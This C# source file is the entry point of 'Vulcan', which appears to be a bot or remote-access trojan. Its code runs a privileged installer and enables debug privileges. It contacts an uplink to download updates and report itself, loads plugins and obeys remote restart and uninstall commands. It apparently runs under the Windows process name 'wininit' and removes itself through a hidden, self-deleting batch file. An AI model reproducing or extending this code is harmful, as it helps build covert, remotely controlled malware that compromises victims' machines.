using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Diagnostics;
using System.IO;
using System.Reflection;
using Vulcan.Core.Installer;
using Vulcan.Core.Config;
using Vulcan.Core.Events;
using Vulcan.Core.PluginFramework;

namespace Vulcan.Core
{
    public class VulcanEntry : IVulcanEntry
    {

        static IList<IVulcanInstaller> installers = new List<IVulcanInstaller>();

        static VulcanEntry()
        {
            installers.Add(new InstallerPrivileged());
        }

        public VulcanEntry()
        {
            EventBus.GetEventBus().RegisterEventHandlers(this);
        }

        public void VMain(string[] args)
        {
            while (true)
            {
                try
                {
                    
                    VulcanConfiguration config = new VulcanConfiguration();
                    Environment.CurrentDirectory = VulcanConfiguration.Instance.InstallLocation;


                    if (args.Length == 0)
                    {
                        foreach (IVulcanInstaller installer in installers)
                        {
                            if (!installer.IsInstalled() && installer.ShouldInstall(config))
                            {
                                installer.Install();
                            }
                        }
                        return;
                    }

                    switch(args[0])
                    {
                        case "restart":
                            KillAll();
                            break;
                    }

                    UnpackLibraries();

                    Process.EnterDebugMode();

                    if (VulcanConfiguration.Instance.PrimaryUplink.CheckForUpdate())
                    {
                        bool result = VulcanConfiguration.Instance.PrimaryUplink.DownloadUpdate();
                        if (result)
                            RestartVulcan();
                    }

                    VulcanConfiguration.Instance.PrimaryUplink.IdentifySelf();

                    VulcanPluginManager manager = new VulcanPluginManager();

                    manager.Init();

                    manager.LoadAll();

                    while (true)
                        System.Threading.Thread.Sleep(1);
                }
                catch (Exception ex)
                {
                    Console.WriteLine("VulcanEntry::VMain() Fail: {0}", ex.ToString());
                    Console.Out.Flush();
                    System.Threading.Thread.Sleep(1800000);
                }
            }
        }

        public static void Main(string[] args)
        {
            VulcanEntry entry = new VulcanEntry();
            entry.VMain(args);
        }


        [EventSubscribe]
        public void OnCommandRecieve(EventCommandRecieved cmd)
        {
            switch(cmd.Message.Trim())
            {
                case "restart-vulcan":
                    RestartVulcan();
                    break;
                case "uninstall-vulcan":
                    UninstallVulcan();
                    break;
            }
        }

        public static void RestartVulcan()
        {
            ProcessStartInfo info = new ProcessStartInfo(Assembly.GetEntryAssembly().Location, "restart");
            info.UseShellExecute = false;
            Console.WriteLine("VulcanEntry::RestartVulcan() Restarting vulcan");
            Process.Start(info);
            Console.WriteLine("VulcanEntry::RestartVulcan() Waiting to be terminated");
            while (true) ;
        }

        public static void UninstallVulcan()
        {
            string bat = Path.GetTempPath() + "\\RemoveVulcan.bat";
            using (StreamWriter sw = new StreamWriter(bat))
            {
                sw.WriteLine("taskkill /f /pid " + Process.GetCurrentProcess().Id);
                sw.WriteLine("rd /q /s \"" + VulcanConfiguration.Instance.InstallLocation + "\"");
                sw.WriteLine("del \"%~f0\"");
            }

            ProcessStartInfo info = new ProcessStartInfo("cmd.exe", "/C \"" + bat + "\" > nul");
            if (VulcanConfiguration.Instance.RunLevel == VulcanRunLevel.System)
                info.Verb = "runas";
            info.WindowStyle = ProcessWindowStyle.Hidden;
            info.UseShellExecute = false;
            Process.Start(info);
            Environment.Exit(0);
        }

        private static void KillAll()
        {
            foreach(Process proc in Process.GetProcessesByName("wininit"))
            {
                if(proc.Modules[0].FileName.ToLower() == Assembly.GetEntryAssembly().Location.ToLower() &&
                    proc.Id != Process.GetCurrentProcess().Id)
                {
                    Console.WriteLine("VulcanEntry::KillAll() Terminating PID {0}", proc.Id);
                    proc.Kill();
                    while (!proc.HasExited) ;
                }
            }

        }

        private static void UnpackLibraries()
        {
            if (!File.Exists("Ionic.Zip.dll"))
            {
                File.WriteAllBytes("Ionic.Zip.dll", Properties.Resources.ZipLib);
                FileHelper.Touch("Ionic.Zip.dll");
            }
        }
    }
}
